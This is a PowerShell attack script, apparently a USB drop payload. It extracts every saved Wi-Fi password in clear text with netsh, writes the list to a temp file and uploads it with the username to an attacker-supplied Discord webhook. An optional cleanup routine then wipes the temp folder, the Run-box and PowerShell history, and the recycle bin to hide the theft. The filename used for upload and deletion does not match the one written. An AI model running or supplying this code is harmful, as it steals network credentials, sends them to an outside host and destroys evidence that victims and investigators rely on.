$filePath="$env:TEMP\wifi-pass.txt"

netsh wlan show profiles|Out-File -FilePath $filePath

netsh wlan show profiles|Select-String " : "|ForEach-Object{($_ -split ":")[1].Trim()}|ForEach-Object{"`n--- WLAN: $_ ---";netsh wlan show profile name="$_" key=clear}|Out-File -FilePath $filePath -Append

$boundary=[System.Guid]::NewGuid().ToString();$LF="`r`n";$bodyLines=("--$boundary","Content-Disposition: form-data; name=`"file`"

filename=`"$([System.IO.Path]::GetFileName($filePath))`"","Content-Type: text/plain","","$(Get-Content -Raw $filePath)","--$boundary--") -join $LF;$headers=@{"Content-Type"="multipart/form-data; boundary=$boundary"}


function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}

############################################################################################################################################################

function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}


RI $env:TEMP/--wifi-pass.txt


